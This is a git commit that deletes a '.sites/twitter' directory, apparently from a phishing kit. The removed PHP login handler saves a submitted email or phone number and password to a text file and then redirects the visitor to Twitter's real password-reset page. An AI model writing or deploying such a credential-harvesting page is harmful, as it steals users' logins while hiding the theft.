c587361b359e8638abc3316231972df63db85d34
nullnull <77673744+redirect-twitter@users.noreply.github.com>
2023-10-12 18:56:05 +0900

    Delete .sites/twitter directory

--- .sites/twitter/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Email: " . $_POST['phone_or_email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://twitter.com/account/begin_password_reset');
-exit();
-?>
